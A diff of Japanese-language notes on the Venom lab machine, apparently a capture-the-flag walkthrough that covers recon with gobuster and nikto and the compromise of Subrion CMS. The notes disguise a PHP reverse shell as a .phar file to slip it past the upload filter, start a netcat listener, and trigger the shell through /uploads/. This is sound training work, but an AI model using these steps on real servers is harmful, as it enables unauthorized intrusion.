@@ -2,7 +2,7 @@
 - sudo -lに!がつく
 - rootになる方法が4つある
 ### keyword
-- ftp,/etc/hosts, exploit(sabrin)
+- ftp,/etc/hosts, exploit(sabrin),CMSのGitHubを見る
 
 ## 攻略
 - nmapをする
@@ -33,7 +33,11 @@
   - `sudo vim /etc/hosts`
   - `192.168.56.? venom.box`
 - サイトを探索するとsubrion cmsと書いてある。Blogとか書いてあるので、wordpressみたいなものか
-- なぜかgobusterできないので、niktoを使う
+- gobusterしようとするができない
+  - errorの原因はリダイレクトしても、そこにURLがないというもの。そこでリダイレクトは無視するオプションをつけるリダイレクトのステータスコードは301
+  - `gobuster dir -u http://venom.box -w $dirsmall -b 301`
+  - これでも特に何も出てこない 
+- niktoを使う
 - `nikto -url venom.box`試す
   - けっこう時間がかかるので、次のを見る
   - `/login/`こっちは一般ユーザのログインであることがわかる
@@ -51,7 +55,8 @@
   - Parrotのターミナルに`php-reverse-shell.php`を置いて、uploadするが、名前が長いので短くして、拡張子の名前も変える`rev.phar` ちなみに.pharの拡張子はphpのアーカイブファイルって意味
   - フロッピーディスクのアイコンから`rev.phar`をuploadに貼り付ける
   - Parrotで待ち受ける`nc -nlvp 9001`
-  - `http://venom.box/upload/rev.phar`にアクセスすると侵入できる
+  - subrionのgithubを見ることで、今のファイルをどこにuploadされているか調べる。すると、そのまま`/uploads/`があるので、それを使う
+  - `http://venom.box/uploads/rev.phar`にアクセスすると侵入できる
 
 - (2)(追記) exploitdbでpythonのコード探す
   - 使い方はコードを見るか`python exploit.py -h`
